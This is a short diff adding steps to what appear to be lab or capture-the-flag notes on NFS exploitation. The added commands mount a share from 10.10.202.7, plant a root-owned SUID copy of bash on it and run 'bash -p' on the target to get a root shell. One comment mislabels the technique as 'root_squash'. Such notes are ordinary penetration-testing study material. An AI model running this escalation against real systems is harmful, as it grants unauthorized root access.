@@ -14,5 +14,13 @@ cd /tmp/mount
 sudo mount -t nfs 10.10.202.7:home /tmp/mount -nolock
 
 # look for files/directories and find sensitive files for exploitation
+# do a root_squash
+cp bash /tmp/mount/dir/.
+cd /tmp/mount/dir
+chown 'root:root' bash
+chmod +sx bash
+
+# with the above you have set the SUID bit and now get on the box and do this.
+./bash -p (p will persist the permissions)
 
 
